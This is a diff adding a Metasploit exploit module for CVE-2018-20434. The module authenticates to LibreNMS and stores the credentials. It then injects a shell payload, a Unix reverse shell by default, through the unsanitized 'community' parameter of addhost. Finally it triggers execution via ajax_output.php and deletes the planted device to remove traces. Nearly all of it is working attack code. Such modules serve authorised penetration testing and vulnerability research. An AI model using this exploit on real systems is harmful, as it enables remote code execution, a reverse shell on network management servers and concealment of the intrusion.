@@ -1,0 +1,163 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'LibreNMS addhost Command Injection',
+      'Description'    => %q(
+         This module exploits a command injection vulnerability in the open source
+         network management software known as LibreNMS. The community parameter used
+         in a POST request to the addhost functionality is unsanitized. This parameter
+         is later used as part of a shell command that gets passed to the popen function
+         in capture.inc.php, which can result in execution of arbitrary code.
+
+         This module requires authentication to LibreNMS first.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'mhaskar',       # Vulnerability discovery and PoC
+        'Shelby Pace'    # Metasploit module
+      ],
+      'References'     =>
+        [
+          [ 'CVE', '2018-20434' ],
+          [ 'URL', 'https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/' ],
+          [ 'URL', 'https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d' ]
+        ],
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+        [
+          [ 'Linux',
+            {
+              'Platform' => 'unix',
+              'DefaultOptions'  =>  { 'Payload' =>  'cmd/unix/reverse' }
+            }
+          ]
+        ],
+      'DisclosureDate' => '2018-12-16',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+    [
+      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),
+      OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),
+      OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ])
+    ])
+  end
+
+  def login
+    login_uri = normalize_uri(target_uri.path, 'login')
+    res = send_request_cgi('method' =>  'GET', 'uri'  =>  login_uri)
+    fail_with(Failure::NotFound, 'Failed to access the login page') unless res && res.code == 200
+
+    cookies = res.get_cookies
+
+    login_res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  login_uri,
+      'cookie'    =>  cookies,
+      'vars_post' =>
+      {
+        'username'  =>  datastore['USERNAME'],
+        'password'  =>  datastore['PASSWORD']
+      }
+    )
+
+    fail_with(Failure::NoAccess, 'Failed to submit credentials to login page') unless login_res && login_res.code == 302
+
+    cookies = login_res.get_cookies
+    res = send_request_cgi('method' =>  'GET', 'uri'  =>  normalize_uri(target_uri.path), 'cookie' =>  cookies)
+    fail_with(Failure::NoAccess, 'Failed to log into LibreNMS') unless res && res.code == 200 && res.body.include?('Devices')
+
+    print_status('Successfully logged into LibreNMS. Storing credentials...')
+    store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])
+    login_res.get_cookies
+  end
+
+  def add_device(cookies)
+    add_uri = normalize_uri(target_uri.path, 'addhost')
+    @hostname = Rex::Text.rand_text_alpha(6...12)
+    comm_payload = "'; #{payload.encoded}#'"
+
+    res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  add_uri,
+      'cookie'    =>  cookies,
+      'vars_post'  =>
+      {
+        'snmp'            =>  'on',
+        'force_add'       =>  'on',
+        'snmpver'         =>  'v2c',
+        'hostname'        =>  @hostname,
+        'community'       =>  comm_payload,
+        'authalgo'        =>  'MD5',
+        'cryptoalgo'      =>  'AES',
+        'transport'       =>  'udp',
+        'port_assoc_mode' =>  'ifIndex'
+      }
+    )
+
+    fail_with(Failure::NotFound, 'Failed to add device') unless res && res.body.include?('Device added')
+    print_good("Successfully added device with hostname #{@hostname}")
+
+    host_id = res.get_html_document.search('div[@class="alert alert-success"]/a[@href]').text
+    fail_with(Failure::NotFound, "Couldn't retrieve the id for the device") if host_id.empty?
+    host_id = host_id.match(/(\d+)/).nil? ? nil : host_id.match(/(\d+)/)
+
+    fail_with(Failure::NotFound, 'Failed to retrieve a valid device id') if host_id.nil?
+
+    host_id
+  end
+
+  def del_device(id, cookies)
+    del_uri = normalize_uri(target_uri.path, 'delhost')
+    res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  del_uri,
+      'cookie'    =>  cookies,
+      'vars_post' =>
+      {
+        'id'      =>  id,
+        'confirm' =>  1
+      }
+    )
+
+    print_status('Unsure if device was deleted. No response received') unless res
+
+    if res.body.include?("Removed device #{@hostname.downcase}")
+      print_good("Successfully deleted device with hostname #{@hostname} and id ##{id}")
+    else
+      print_status('Failed to delete device. Manual deletion may be needed')
+    end
+  end
+
+  def exploit
+    exp_uri = normalize_uri(target_uri.path, 'ajax_output.php')
+    cookies = login
+
+    host_id = add_device(cookies)
+    send_request_cgi(
+      'method'    =>  'GET',
+      'uri'       =>  exp_uri,
+      'cookie'    =>  cookies,
+      'vars_get'  =>
+      {
+        'id'        =>  'capture',
+        'format'    =>  'text',
+        'type'      =>  'snmpwalk',
+        'hostname'  =>  @hostname
+      }
+    )
+
+    del_device(host_id, cookies)
+  end
+end
